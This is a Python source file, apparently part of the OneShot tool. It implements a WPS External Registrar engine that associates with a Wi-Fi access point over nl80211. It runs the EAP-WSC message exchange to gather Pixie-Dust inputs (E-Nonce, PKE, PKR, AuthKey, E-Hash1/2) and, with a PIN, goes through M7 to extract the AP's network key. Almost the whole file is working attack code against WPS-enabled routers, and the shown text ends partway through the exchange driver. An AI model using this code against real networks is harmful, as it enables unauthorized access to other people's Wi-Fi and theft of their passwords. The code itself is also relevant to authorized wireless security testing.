#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Native WPS External Registrar engine — pure Python, stdlib only.

Replaces the parts of wpa_supplicant OneShot drives for a WPS PIN attack:
associate with the AP in MANAGED mode (nl80211, no monitor mode) and run the
EAPOL / EAP-WSC exchange acting as the WPS External Registrar (so the AP is
the Enrollee, which is what Pixie-Dust needs).

Layers:
  * WSC TLV codec + EAP/EAPOL framing (byte-compatible with hostap)
  * WpsRegistrar — the message state machine (M1 in, M2 out, M3 in ...)
  * EAPOL transport: control-port-over-nl80211 when the driver supports it,
    otherwise an AF_PACKET socket bound to ETH_P_ALL (the hostap l2_packet
    workaround for the unauthorized-station RX regression)
  * nl80211 CONNECT association (managed mode)

It collects the six Pixie-Dust inputs (E-Nonce, PKE, PKR, AuthKey, E-Hash1,
E-Hash2) after M3, and runs through M7 to recover the AP's PSK.

The protocol/crypto/message layers are unit-tested in-process against a mirror
enrollee. The live nl80211 association + control-port transport REQUIRES a
rooted device with a real Wi-Fi adapter and is NOT exercised by the test suite.
"""
import os
import socket
import struct
import time

import wps_crypto as wc
from wps_crypto import (NONCE_LEN, derive_keys, authenticator)

# ---- WSC attribute IDs (wps_defs.h) ----
ATTR_AUTH_TYPE_FLAGS = 0x1004
ATTR_AUTHENTICATOR = 0x1005
ATTR_CONFIG_METHODS = 0x1008
ATTR_CONFIG_ERROR = 0x1009
ATTR_CONN_TYPE_FLAGS = 0x100d
ATTR_ENCR_TYPE_FLAGS = 0x1010
ATTR_DEV_NAME = 0x1011
ATTR_DEV_PASSWORD_ID = 0x1012
ATTR_E_HASH1 = 0x1014
ATTR_E_HASH2 = 0x1015
ATTR_E_SNONCE1 = 0x1016
ATTR_E_SNONCE2 = 0x1017
ATTR_ENCR_SETTINGS = 0x1018
ATTR_SSID = 0x1045
ATTR_ENROLLEE_NONCE = 0x101a
ATTR_KEY_WRAP_AUTH = 0x101e
ATTR_MAC_ADDR = 0x1020
ATTR_MANUFACTURER = 0x1021
ATTR_MSG_TYPE = 0x1022
ATTR_MODEL_NAME = 0x1023
ATTR_MODEL_NUMBER = 0x1024
ATTR_NETWORK_KEY = 0x1027
ATTR_PUBLIC_KEY = 0x1032
ATTR_REGISTRAR_NONCE = 0x1039
ATTR_RF_BANDS = 0x103c
ATTR_R_HASH1 = 0x103d
ATTR_R_HASH2 = 0x103e
ATTR_R_SNONCE1 = 0x103f
ATTR_R_SNONCE2 = 0x1040
ATTR_SERIAL_NUMBER = 0x1042
ATTR_UUID_R = 0x1048
ATTR_VENDOR_EXT = 0x1049
ATTR_VERSION = 0x104a
ATTR_PRIMARY_DEV_TYPE = 0x1054
ATTR_ASSOC_STATE = 0x1002
ATTR_OS_VERSION = 0x102d

# ---- WPS message types ----
WPS_M1, WPS_M2, WPS_M3, WPS_M4 = 0x04, 0x05, 0x07, 0x08
WPS_M5, WPS_M6, WPS_M7, WPS_M8 = 0x09, 0x0a, 0x0b, 0x0c
WPS_WSC_ACK, WPS_WSC_NACK, WPS_WSC_DONE = 0x0d, 0x0e, 0x0f

# ---- EAP / EAPOL ----
EAPOL_VERSION = 2
EAPOL_TYPE_EAP = 0
EAPOL_TYPE_START = 1
EAP_CODE_REQUEST = 1
EAP_CODE_RESPONSE = 2
EAP_CODE_FAIL = 4
EAP_TYPE_IDENTITY = 1
EAP_TYPE_EXPANDED = 254
EAP_VENDOR_WFA = b'\x00\x37\x2a'
EAP_VENDOR_TYPE_WSC = 1
WSC_FLAGS_MF = 0x01
WSC_FLAGS_LF = 0x02
WSC_Start, WSC_ACK, WSC_NACK, WSC_MSG, WSC_Done, WSC_FRAG_ACK = (
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06)
ETH_P_PAE = 0x888E
ETH_P_ALL = 0x0003
PACKET_OUTGOING = 4
REGISTRAR_IDENTITY = b'WFA-SimpleConfig-Registrar-1-0'
WFA_VENDOR_EXT = b'\x00\x37\x2a'   # WFA OUI inside WSC Vendor Extension
WPS_VERSION = 0x10
WPS_VERSION2 = 0x20


class WpsProtocolError(Exception):
    pass


# --------------------------------------------------------------------------
# WSC TLV codec
# --------------------------------------------------------------------------
def attr(attr_type, value):
    return struct.pack('>HH', attr_type, len(value)) + value


def attr_u8(attr_type, v):
    return attr(attr_type, struct.pack('B', v))


def attr_be16(attr_type, v):
    return attr(attr_type, struct.pack('>H', v))


def attr_be32(attr_type, v):
    return attr(attr_type, struct.pack('>I', v))


def parse_attrs(buf):
    """Parse WSC TLVs into a list of (type, value) preserving order/duplicates."""
    out = []
    i = 0
    while i + 4 <= len(buf):
        atype, alen = struct.unpack_from('>HH', buf, i)
        i += 4
        if i + alen > len(buf):
            break
        out.append((atype, buf[i:i + alen]))
        i += alen
    return out


def attrs_dict(buf):
    """First occurrence of each attribute as {type: value}."""
    d = {}
    for t, v in parse_attrs(buf):
        d.setdefault(t, v)
    return d


def _version_attrs():
    # Version (deprecated 0x10) + WFA Vendor Extension carrying Version2 (0x20).
    v2 = WFA_VENDOR_EXT + bytes([0x00, 0x01, WPS_VERSION2])   # subelem VERSION2
    return attr_u8(ATTR_VERSION, WPS_VERSION) + attr(ATTR_VENDOR_EXT, v2)


def build_encrypted_settings(keywrapkey, authkey, inner_attrs):
    """Wrap WSC attributes as ATTR_ENCR_SETTINGS value (IV || AES-128-CBC)."""
    kwa_attr = attr(ATTR_KEY_WRAP_AUTH, wc.kwa(authkey, inner_attrs))
    plaintext = inner_attrs + kwa_attr
    pad = 16 - (len(plaintext) % 16)               # PKCS#7
    plaintext += bytes([pad]) * pad
    iv = os.urandom(16)
    return iv + wc.aes128_cbc_encrypt(keywrapkey, iv, plaintext)


def parse_encrypted_settings(keywrapkey, authkey, blob):
    """Decrypt ATTR_ENCR_SETTINGS, verify the KWA, return {attr: value}."""
    if len(blob) < 32 or len(blob) % 16:
        raise WpsProtocolError('bad Encrypted Settings length')
    iv, ct = blob[:16], blob[16:]
    plaintext = wc.aes128_cbc_decrypt(keywrapkey, iv, ct)
    pad = plaintext[-1]
    if pad < 1 or pad > 16 or pad > len(plaintext):
        raise WpsProtocolError('bad padding (wrong key/PIN?)')
    plaintext = plaintext[:-pad]
    marker = struct.pack('>HH', ATTR_KEY_WRAP_AUTH, 8)
    pos = plaintext.rfind(marker)
    if pos < 0:
        raise WpsProtocolError('missing Key Wrap Authenticator')
    inner = plaintext[:pos]
    got = plaintext[pos + 4:pos + 12]
    if wc.kwa(authkey, inner) != got:
        raise WpsProtocolError('Key Wrap Authenticator mismatch (wrong PIN/key)')
    return attrs_dict(inner)


# --------------------------------------------------------------------------
# EAP / EAPOL framing
# --------------------------------------------------------------------------
def eapol_frame(eapol_type, payload=b''):
    return struct.pack('>BBH', EAPOL_VERSION, eapol_type, len(payload)) + payload


def eapol_start():
    return eapol_frame(EAPOL_TYPE_START)


def eap_packet(code, ident, type_and_data):
    length = 4 + len(type_and_data)
    return struct.pack('>BBH', code, ident, length) + type_and_data


def eap_identity_response(ident, identity):
    return eapol_frame(EAPOL_TYPE_EAP,
                       eap_packet(EAP_CODE_RESPONSE, ident,
                                  bytes([EAP_TYPE_IDENTITY]) + identity))


def eap_wsc_response(ident, op_code, message, flags=0):
    hdr = bytes([EAP_TYPE_EXPANDED]) + EAP_VENDOR_WFA + struct.pack('>I', EAP_VENDOR_TYPE_WSC)
    body = bytes([op_code, flags]) + message
    return eapol_frame(EAPOL_TYPE_EAP, eap_packet(EAP_CODE_RESPONSE, ident, hdr + body))


def parse_eapol(frame):
    """Return (eapol_type, payload) or raise on a short/garbage frame."""
    if len(frame) < 4:
        raise WpsProtocolError('short EAPOL frame')
    ver, etype, elen = struct.unpack_from('>BBH', frame, 0)
    return etype, frame[4:4 + elen]


def parse_eap(payload):
    """Return dict describing an EAP packet (identity request or WSC)."""
    if len(payload) < 4:
        raise WpsProtocolError('short EAP packet')
    code, ident, length = struct.unpack_from('>BBH', payload, 0)
    body = payload[4:length] if length <= len(payload) else payload[4:]
    info = {'code': code, 'id': ident}
    if not body:
        info['type'] = None
        return info
    etype = body[0]
    info['type'] = etype
    if etype == EAP_TYPE_IDENTITY:
        info['identity'] = body[1:]
    elif etype == EAP_TYPE_EXPANDED:
        # vendor(3) + vendor_type(4) + op_code(1) + flags(1) + message
        if len(body) >= 1 + 3 + 4 + 2:
            info['vendor'] = body[1:4]
            info['vendor_type'] = struct.unpack_from('>I', body, 4)[0]
            info['op_code'] = body[8]
            info['flags'] = body[9]
            msg = body[10:]
            if info['flags'] & WSC_FLAGS_LF:
                # 2-byte total length prefix on first fragment
                msg = msg[2:]
            info['message'] = msg
    return info


# --------------------------------------------------------------------------
# WPS Registrar message state machine
# --------------------------------------------------------------------------
class WpsRegistrar:
    """Builds/parses WSC messages as the External Registrar (AP = Enrollee)."""

    def __init__(self, registrar_mac, pin=None,
                 device_name=b'OneShot', manufacturer=b'OneShot',
                 model_name=b'OneShot', model_number=b'1', serial=b'12345678'):
        self.registrar_mac = registrar_mac          # 6 bytes
        self.pin = pin
        self.device_name = device_name
        self.manufacturer = manufacturer
        self.model_name = model_name
        self.model_number = model_number
        self.serial = serial

        self.dh_priv, self.pkr = wc.dh_keypair()     # our (registrar) DH keys
        self.nonce_r = os.urandom(NONCE_LEN)
        self.uuid_r = os.urandom(16)
        self.rs1 = os.urandom(NONCE_LEN)             # registrar secret nonces
        self.rs2 = os.urandom(NONCE_LEN)

        # filled from M1
        self.pke = None
        self.nonce_e = None
        self.enrollee_mac = None
        self.ap_serial = None   # AP's WPS Serial Number attribute (often a placeholder)
        self.authkey = self.keywrapkey = self.emsk = None
        self.psk1 = self.psk2 = None
        # filled from M3
        self.e_hash1 = self.e_hash2 = None
        # filled from M7 (full PIN path)
        self.network_key = None
        self.found_ssid = None
        self.reached_m5 = False
        self.first_half_ok = False
        self.finished = False
        # last message we sent / received (for the running Authenticator)
        self._last_recv = None
        self._last_sent = None

    # -- M1 (received from the AP/enrollee) --
    def process_m1(self, msg):
        a = attrs_dict(msg)
        if a.get(ATTR_MSG_TYPE) != bytes([WPS_M1]):
            raise WpsProtocolError('expected M1')
        self.pke = a[ATTR_PUBLIC_KEY]
        self.nonce_e = a[ATTR_ENROLLEE_NONCE]
        self.enrollee_mac = a[ATTR_MAC_ADDR]
        self.ap_serial = (a.get(ATTR_SERIAL_NUMBER) or b'').decode('utf-8', 'replace') or None
        self.authkey, self.keywrapkey, self.emsk = derive_keys(
            self.pke, self.dh_priv, self.nonce_e, self.enrollee_mac, self.nonce_r)
        if self.pin is not None:
            self.psk1, self.psk2 = wc.derive_psk(self.authkey, str(self.pin))
        self._last_recv = msg

    # -- M2 (sent to the AP/enrollee) --
    def build_m2(self):
        body = (_version_attrs()
                + attr_u8(ATTR_MSG_TYPE, WPS_M2)
                + attr(ATTR_ENROLLEE_NONCE, self.nonce_e)
                + attr(ATTR_REGISTRAR_NONCE, self.nonce_r)
                + attr(ATTR_UUID_R, self.uuid_r)
                + attr(ATTR_PUBLIC_KEY, self.pkr)
                + attr_be16(ATTR_AUTH_TYPE_FLAGS, 0x003F)
                + attr_be16(ATTR_ENCR_TYPE_FLAGS, 0x000F)
                + attr_u8(ATTR_CONN_TYPE_FLAGS, 0x01)
                + attr_be16(ATTR_CONFIG_METHODS, 0x018C)
                + attr(ATTR_MANUFACTURER, self.manufacturer)
                + attr(ATTR_MODEL_NAME, self.model_name)
                + attr(ATTR_MODEL_NUMBER, self.model_number)
                + attr(ATTR_SERIAL_NUMBER, self.serial)
                + attr(ATTR_PRIMARY_DEV_TYPE, b'\x00\x01\x00\x50\xf2\x04\x00\x01')
                + attr(ATTR_DEV_NAME, self.device_name)
                + attr_u8(ATTR_RF_BANDS, 0x01)
                + attr_be16(ATTR_ASSOC_STATE, 0x0000)
                + attr_be16(ATTR_CONFIG_ERROR, 0x0000)
                + attr_be16(ATTR_DEV_PASSWORD_ID, 0x0000)
                + attr_be32(ATTR_OS_VERSION, 0x80000000))
        auth = authenticator(self.authkey, self._last_recv, body)
        msg = body + attr(ATTR_AUTHENTICATOR, auth)
        self._last_sent = msg
        return msg

    # -- M3 (received from the AP/enrollee) --
    def process_m3(self, msg):
        a = attrs_dict(msg)
        if a.get(ATTR_MSG_TYPE) != bytes([WPS_M3]):
            raise WpsProtocolError('expected M3')
        self.e_hash1 = a[ATTR_E_HASH1]
        self.e_hash2 = a[ATTR_E_HASH2]
        self._last_recv = msg

    # -- M4 (sent): R-Hash1/2 + Encrypted Settings{R-S1} (full PIN path) --
    def build_m4(self):
        if self.psk1 is None:
            raise WpsProtocolError('M4 requires a PIN')
        r_hash1 = wc.wps_hash(self.authkey, self.rs1, self.psk1, self.pke, self.pkr)
        r_hash2 = wc.wps_hash(self.authkey, self.rs2, self.psk2, self.pke, self.pkr)
        encr = build_encrypted_settings(self.keywrapkey, self.authkey,
                                        attr(ATTR_R_SNONCE1, self.rs1))
        body = (_version_attrs() + attr_u8(ATTR_MSG_TYPE, WPS_M4)
                + attr(ATTR_ENROLLEE_NONCE, self.nonce_e)
                + attr(ATTR_R_HASH1, r_hash1) + attr(ATTR_R_HASH2, r_hash2)
                + attr(ATTR_ENCR_SETTINGS, encr))
        auth = authenticator(self.authkey, self._last_recv, body)
        msg = body + attr(ATTR_AUTHENTICATOR, auth)
        self._last_sent = msg
        return msg

    # -- M5 (received): Encrypted Settings{E-S1}; confirms first PIN half --
    def process_m5(self, msg):
        a = attrs_dict(msg)
        settings = parse_encrypted_settings(self.keywrapkey, self.authkey,
                                            a[ATTR_ENCR_SETTINGS])
        es1 = settings[ATTR_E_SNONCE1]
        expect = wc.wps_hash(self.authkey, es1, self.psk1, self.pke, self.pkr)
        self.first_half_ok = (expect == self.e_hash1)
        if not self.first_half_ok:
            raise WpsProtocolError('first half of PIN is incorrect')
        self._last_recv = msg

    # -- M6 (sent): Encrypted Settings{R-S2} --
    def build_m6(self):
        encr = build_encrypted_settings(self.keywrapkey, self.authkey,
                                        attr(ATTR_R_SNONCE2, self.rs2))
        body = (_version_attrs() + attr_u8(ATTR_MSG_TYPE, WPS_M6)
                + attr(ATTR_ENROLLEE_NONCE, self.nonce_e)
                + attr(ATTR_ENCR_SETTINGS, encr))
        auth = authenticator(self.authkey, self._last_recv, body)
        msg = body + attr(ATTR_AUTHENTICATOR, auth)
        self._last_sent = msg
        return msg

    # -- M7 (received): the AP's Encrypted Settings carrying its credential --
    def process_m7(self, msg):
        a = attrs_dict(msg)
        settings = parse_encrypted_settings(self.keywrapkey, self.authkey,
                                            a[ATTR_ENCR_SETTINGS])
        if ATTR_NETWORK_KEY in settings:
            self.network_key = settings[ATTR_NETWORK_KEY].decode('utf-8', 'replace')
        if ATTR_SSID in settings:
            self.found_ssid = settings[ATTR_SSID].decode('utf-8', 'replace')
        self.finished = True
        self._last_recv = msg

    def credential(self):
        """The recovered AP credential, or None (full PIN path)."""
        if self.network_key is None:
            return None
        return {'ssid': self.found_ssid, 'psk': self.network_key}

    def pixie_data(self):
        """The six values pixiewps needs, as uppercase hex (or None)."""
        if not all((self.pke, self.pkr, self.e_hash1, self.e_hash2,
                    self.authkey, self.nonce_e)):
            return None
        h = (lambda b: b.hex().upper())
        return {
            'pke': h(self.pke), 'pkr': h(self.pkr),
            'e_hash1': h(self.e_hash1), 'e_hash2': h(self.e_hash2),
            'authkey': h(self.authkey), 'e_nonce': h(self.nonce_e),
        }


# --------------------------------------------------------------------------
# EAPOL transport over nl80211 control-port frames (live path)
# --------------------------------------------------------------------------
class EapolPort:
    """Send/receive EAPOL over the connection's nl80211 socket.

    Uses NL80211_CMD_CONTROL_PORT_FRAME (control-port-over-nl80211), which is how
    FullMAC drivers (most Android phone chips) deliver EAPOL — they do NOT pass it
    up via AF_PACKET. The socket is the one returned by associate() (SOCKET_OWNER),
    so received control-port frames are delivered to it.
    """

    def __init__(self, sock, family_id, ifindex, peer_mac, timeout=8):
        self.sock = sock
        self.family_id = family_id
        self.ifindex = ifindex
        self.peer_mac = peer_mac
        self._seq = 20
        sock.settimeout(timeout)

    def send(self, frame):
        import nl80211_scan as nl
        self._seq += 1
        attrs = (nl._attr(NL80211_ATTR_IFINDEX, struct.pack('=I', self.ifindex))
                 + nl._attr(NL80211_ATTR_CONTROL_PORT_ETHERTYPE, struct.pack('=H', ETH_P_PAE))
                 + nl._attr(NL80211_ATTR_MAC, self.peer_mac)
                 + nl._attr(NL80211_ATTR_FRAME, frame)
                 + nl._attr(NL80211_ATTR_CONTROL_PORT_NO_ENCRYPT, b''))
        nl._send(self.sock, nl._genl_msg(self.family_id, NL80211_CMD_CONTROL_PORT_FRAME,
                                         self._seq, nl.NLM_F_REQUEST | nl.NLM_F_ACK, attrs))
        # The TX ack/cookie is left in the queue; recv() skips non-event messages.

    def recv(self):
        """Return the next inbound EAPOL PDU. Raises socket.timeout on timeout."""
        import nl80211_scan as nl
        while True:
            data = self.sock.recv(65536)   # raises socket.timeout
            i = 0
            while i + 16 <= len(data):
                mlen, mtype = struct.unpack_from('=IH', data, i)[:2]
                if mlen < 16:
                    break
                payload = data[i + 16:i + mlen]
                if (mtype == self.family_id and payload
                        and payload[0] == NL80211_CMD_CONTROL_PORT_FRAME):
                    a = nl._parse_attrs(payload[4:])
                    return self._strip_eth(a.get(NL80211_ATTR_FRAME, b''))
                i += _align_msg(mlen)

    @staticmethod
    def _strip_eth(frame):
        # RX may be a full 802.3 frame (dst|src|ethertype|payload) or just the
        # EAPOL PDU — normalise to the EAPOL PDU.
        if len(frame) >= 14 and frame[12:14] == b'\x88\x8e':
            return frame[14:]
        return frame

    def close(self):
        # The underlying socket is the connection owner; _drive closes it.
        pass


class EapolSocket:
    """Fallback EAPOL transport over AF_PACKET (drivers without control-port-over-nl80211).

    Bound to ETH_P_ALL and filtered to 0x888E in Python. hostap's normal
    station path binds ETH_P_PAE directly and that works; ETH_P_ALL is a strict
    superset of what an ETH_P_PAE bind delivers (it also catches the
    unauthorized-port case hostap only handles via its bridge workaround), so
    binding ETH_P_ALL maximises RX coverage with no downside. recvfrom returns
    the ethertype in the address tuple, so we drop non-EAPOL frames cheaply.

    NOTE: the decisive fix for "associated but no EAPOL" was not the bind
    protocol but opening this socket BEFORE association (see _drive) — the AP
    sends EAP-Request/Identity right after assoc and it is lost if we bind late.
    """

    def __init__(self, interface, peer_mac, timeout=8):
        self.interface = interface
        self.peer_mac = peer_mac
        self.timeout = timeout
        self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_DGRAM, socket.htons(ETH_P_ALL))
        self.sock.bind((interface, ETH_P_ALL))

    def send(self, frame):
        # The ethertype/dest come from the address tuple, so TX is still EAPOL
        # to the AP even though the socket itself is bound to ETH_P_ALL.
        self.sock.sendto(frame, (self.interface, ETH_P_PAE, 0, 0, self.peer_mac))

    def recv(self):
        deadline = time.monotonic() + self.timeout
        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise socket.timeout()
            self.sock.settimeout(remaining)
            data, addr = self.sock.recvfrom(2048)
            # addr = (ifname, ethertype, pkttype, hatype, hwaddr)
            if addr[1] != ETH_P_PAE:
                continue                      # not EAPOL — drop
            if len(addr) > 2 and addr[2] == PACKET_OUTGOING:
                continue                      # our own transmitted frame, echoed back
            return data

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass


# --------------------------------------------------------------------------
# nl80211 association (managed mode, no monitor) — live path
# --------------------------------------------------------------------------
NL80211_CMD_CONNECT = 46
NL80211_CMD_DISCONNECT = 48
NL80211_CMD_CONTROL_PORT_FRAME = 129
NL80211_ATTR_IFINDEX = 3
NL80211_ATTR_MAC = 6
NL80211_ATTR_FRAME = 51
NL80211_ATTR_SSID = 52
NL80211_ATTR_AUTH_TYPE = 53
NL80211_ATTR_IE = 42
NL80211_ATTR_WIPHY_FREQ = 38
NL80211_ATTR_STATUS_CODE = 72            # was wrongly 48 (=KEY_TYPE); masked real CONNECT status
NL80211_ATTR_CONTROL_PORT = 68            # was wrongly 84
NL80211_ATTR_CONTROL_PORT_ETHERTYPE = 102
NL80211_ATTR_CONTROL_PORT_NO_ENCRYPT = 103
NL80211_ATTR_CONTROL_PORT_OVER_NL80211 = 264
NL80211_ATTR_SOCKET_OWNER = 204
NL80211_AUTHTYPE_OPEN_SYSTEM = 0
ATTR_REQUEST_TYPE = 0x103a
WPS_REQ_TYPE_REGISTRAR = 0x02


def wsc_assoc_ie():
    """WSC IE for the (re)association request advertising an External Registrar.

    Byte-for-byte the same as hostap's wps_build_assoc_req_ie(WPS_REQ_REGISTRAR):
    OUI+type, Version(0x10), RequestType(Registrar), then the WFA vendor extension
    carrying Version2(0x20). A WPS 2.0 AP (Ralink/MTK included) can reject the
    open association outright if the Version2 ext is missing — that surfaces as a
    status-1 association reject, not just "WPS doesn't start".
    """
    v2_ext = WFA_VENDOR_EXT + bytes([0x00, 0x01, WPS_VERSION2])   # WFA_ELEM_VERSION2
    body = (b'\x00\x50\xf2\x04'                            # WPS OUI 00:50:F2 + type 0x04
            + attr_u8(ATTR_VERSION, WPS_VERSION)
            + attr_u8(ATTR_REQUEST_TYPE, WPS_REQ_TYPE_REGISTRAR)
            + attr(ATTR_VENDOR_EXT, v2_ext))
    return bytes([0xDD, len(body)]) + body                 # element id 221 (vendor)


def _wlog(verbose, msg):
    if verbose:
        print('[WPS] ' + msg)


def _lookup_bss(interface, bssid):
    """Find the AP's frequency and SSID from a scan (also warms the kernel cache).

    Returns (freq, ssid_str); either may be 0/'' if the AP wasn't seen.
    """
    import nl80211_scan as nl
    try:
        for net in nl.scan(interface):
            if net.get('BSSID') == bssid:
                return net.get('Frequency') or 0, net.get('ESSID') or ''
    except Exception:
        pass
    return 0, ''


def associate(interface, bssid_bytes, ssid_bytes, freq=0, verbose=False):
    """Associate in MANAGED mode via nl80211 NL80211_CMD_CONNECT (no monitor mode).

    Returns (sock, family_id, ifindex, over_nl80211). The socket OWNS the
    connection (SOCKET_OWNER) — keep it open for the whole WPS exchange; closing
    it tears the link down. over_nl80211 is True if the driver accepted
    control-port-over-nl80211 (EAPOL via nl80211); False means use AF_PACKET.
    Raises Nl80211Error on failure. LIVE PATH — needs root + a real adapter.
    """
    import nl80211_scan as nl
    ifindex = socket.if_nametoindex(interface)
    bssid_str = ':'.join('%02X' % b for b in bssid_bytes)
    # NL80211_CMD_CONNECT needs the SSID (a BSSID-only connect is rejected with
    # status 1 by most drivers). When the caller didn't pass one (e.g. -b without
    # -s), resolve it — and the frequency — from a scan, like wpa_supplicant does.
    if not freq or not ssid_bytes:
        scan_freq, scan_ssid = _lookup_bss(interface, bssid_str)
        if not freq:
            freq = scan_freq
        if not ssid_bytes and scan_ssid:
            ssid_bytes = scan_ssid.encode()
        _wlog(verbose, 'scan: AP {} on {} MHz, ssid={!r}'.format(
            bssid_str, freq or 'unknown', ssid_bytes.decode('utf-8', 'replace')))
    if not ssid_bytes:
        raise nl.Nl80211Error(
            'could not resolve the SSID for {} from a scan — pass it explicitly '
            'with -s <SSID> (a hidden AP will not appear by BSSID alone)'.format(bssid_str))
    sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, nl.NETLINK_GENERIC)
    sock.bind((0, 0))
    sock.settimeout(8)
    try:
        family_id, mcast = nl._resolve_family(sock, 'nl80211')
        # The CONNECT result is delivered as an event on the 'mlme' multicast
        # group — join it or _await_connect_result never sees the result.
        grp = mcast.get('mlme')
        if grp is not None:
            try:
                sock.setsockopt(nl.SOL_NETLINK, nl.NETLINK_ADD_MEMBERSHIP, grp)
            except OSError:
                pass
        # Drop any existing association first. On Android the system framework
        # keeps wlan0 connected to a network; a FullMAC chip cannot associate to
        # our target (often on a different channel) while that connection is
        # live, so the CONNECT comes back rejected (status 1). Disconnecting
        # frees the interface. Ignore errors — there may be nothing to drop, or
        # the framework may own it (then the user must disconnect Wi-Fi himself).
        try:
            nl._send(sock, nl._genl_msg(
                family_id, NL80211_CMD_DISCONNECT, 9, nl.NLM_F_REQUEST | nl.NLM_F_ACK,
                nl._attr(NL80211_ATTR_IFINDEX, struct.pack('=I', ifindex))))
            for _ in nl._read_until_done(sock):
                pass
        except (nl.Nl80211Error, OSError):
            pass
        time.sleep(0.5)   # let the disconnect settle before associating
        attrs = (nl._attr(NL80211_ATTR_IFINDEX, struct.pack('=I', ifindex))
                 + nl._attr(NL80211_ATTR_MAC, bssid_bytes)
                 + nl._attr(NL80211_ATTR_SSID, ssid_bytes)
                 + nl._attr(NL80211_ATTR_AUTH_TYPE, struct.pack('=I', NL80211_AUTHTYPE_OPEN_SYSTEM))
                 + nl._attr(NL80211_ATTR_IE, wsc_assoc_ie())
                 + nl._attr(NL80211_ATTR_CONTROL_PORT, b'')   # userspace owns 802.1X port
                 + nl._attr(NL80211_ATTR_SOCKET_OWNER, b''))
        if freq:
            attrs += nl._attr(NL80211_ATTR_WIPHY_FREQ, struct.pack('=I', freq))

        # A single plain CONNECT, exactly like wpa_supplicant on a driver without
        # control-port-over-nl80211. With over_nl80211 NOT requested, the kernel
        # uses its legacy behaviour and delivers EAPOL to the netdev (AF_PACKET),
        # so we never need that path — and never trigger its -95 / a second
        # CONNECT on the same socket. EAPOL transport is therefore always
        # AF_PACKET here (the returned over_nl80211 flag is always False).
        nl._send(sock, nl._genl_msg(family_id, NL80211_CMD_CONNECT, 10,
                                    nl.NLM_F_REQUEST | nl.NLM_F_ACK, attrs))
        for _ in nl._read_until_done(sock):   # CONNECT command ACK
            pass
        _wlog(verbose, '→ NL80211_CMD_CONNECT sent (open auth + WSC registrar IE)')
        _await_connect_result(sock, family_id, verbose)
        _wlog(verbose, '← CONNECT result: associated (status 0)')
        return sock, family_id, ifindex, False
    except Exception:
        sock.close()
        raise


def _await_connect_result(sock, family_id, verbose=False):
    """Block for the NL80211_CMD_CONNECT result event; raise if status != 0."""
    import nl80211_scan as nl
    while True:
        try:
            data = sock.recv(65536)
        except socket.timeout:
            raise nl.Nl80211Error('association timed out (no CONNECT result event)')
        i = 0
        while i + 16 <= len(data):
            mlen, mtype = struct.unpack_from('=IH', data, i)[:2]
            if mlen < 16:
                break
            payload = data[i + 16:i + mlen]
            if mtype == family_id and payload and payload[0] == NL80211_CMD_CONNECT:
                cattrs = nl._parse_attrs(payload[4:])
                sc = cattrs.get(NL80211_ATTR_STATUS_CODE)
                status = struct.unpack('=H', sc[:2])[0] if sc and len(sc) >= 2 else 0
                if status != 0:
                    raise nl.Nl80211Error(
                        'association rejected (status {}). Likely causes: (1) the system '
                        'Wi-Fi still owns the chip — on Android fully DISABLE Wi-Fi (this '
                        'stops the framework wpa_supplicant; merely disconnecting is not '
                        'enough), then retry; (2) the target is on a 5 GHz channel that the '
                        'regulatory domain marks no-IR (passive/scan-only), which forbids '
                        'initiating association — try a 2.4 GHz target instead.'.format(status))
                return
            i += _align_msg(mlen)


def _align_msg(n):
    return (n + 3) & ~3


def _mac_bytes(bssid):
    return bytes(int(b, 16) for b in bssid.split(':'))


class WpsConnection:
    """High-level driver: associate + run the EAP-WSC registrar exchange.

    LIVE PATH. Requires root, a real Wi-Fi adapter, and that no other supplicant
    (NetworkManager / system wpa_supplicant) owns the interface.
    """

    def __init__(self, interface, bssid, ssid='', timeout=8, verbose=False):
        self.interface = interface
        self.bssid = bssid.upper()
        self.ssid = ssid or ''
        self.timeout = timeout
        self.verbose = verbose

    def _log(self, msg):
        if self.verbose:
            print('[WPS] ' + msg)

    def _own_mac(self):
        with open('/sys/class/net/{}/address'.format(self.interface)) as f:
            return _mac_bytes(f.read().strip())

    @staticmethod
    def _recv_eap(eapol):
        """Receive one logical EAP packet, reassembling EAP-WSC MF fragments.

        Acks each non-final fragment with WSC_FRAG_ACK. Returns a parse_eap()
        dict whose 'message' is the fully reassembled WSC message, or None on
        timeout.
        """
        try:
            while True:
                etype, payload = parse_eapol(eapol.recv())
                if etype != EAPOL_TYPE_EAP:
                    continue
                info = parse_eap(payload)
                if info.get('type') != EAP_TYPE_EXPANDED or not (info.get('flags', 0) & WSC_FLAGS_MF):
                    return info
                # Fragmented message: accumulate until a fragment clears MF.
                parts = [info.get('message', b'')]
                ident, op_code = info['id'], info['op_code']
                while True:
                    eapol.send(eap_wsc_response(ident, WSC_FRAG_ACK, b''))
                    etype, payload = parse_eapol(eapol.recv())
                    if etype != EAPOL_TYPE_EAP:
                        continue
                    frag = parse_eap(payload)
                    if frag.get('type') != EAP_TYPE_EXPANDED or frag.get('op_code') != op_code:
                        continue
                    parts.append(frag.get('message', b''))
                    ident = frag['id']
                    if not (frag.get('flags', 0) & WSC_FLAGS_MF):
                        info['message'] = b''.join(parts)
                        info['id'] = ident
                        return info
        except socket.timeout:
            return None

    def _drive(self, reg, stop):
        """Associate, then pump the EAP-WSC exchange. Returns the WpsRegistrar.

        @stop — 'm3' (Pixie-Dust data), 'm5' (first-half check), or 'm7' (full).
        """
        self._log('Associating with {}…'.format(self.bssid))
        peer = _mac_bytes(self.bssid)
        # Open the AF_PACKET EAPOL socket BEFORE associating. The AP drives the
        # exchange: it sends EAP-Request/Identity immediately after association
        # (a supplicant only sends EAPOL-Start as a fallback — hostap
        # eapol_supp_sm.c). wpa_supplicant's RX socket is always open before the
        # association completes; if we bind only afterwards, that first frame is
        # already gone. Pre-binding here is what makes EAPOL actually arrive.
        eapol_pkt = EapolSocket(self.interface, peer, self.timeout)
        try:
            sock, family_id, ifindex, over_nl80211 = associate(
                self.interface, peer, self.ssid.encode(), verbose=self.verbose)
        except Exception:
            eapol_pkt.close()
            raise
        if over_nl80211:
            self._log('EAPOL over nl80211 control port')
            eapol_pkt.close()
            eapol = EapolPort(sock, family_id, ifindex, peer, self.timeout)
        else:
            self._log('EAPOL over AF_PACKET')
            eapol = eapol_pkt
        try:
            eapol.send(eapol_start())
            self._log('→ EAPOL-Start')
            got_any = False
            starts = 1
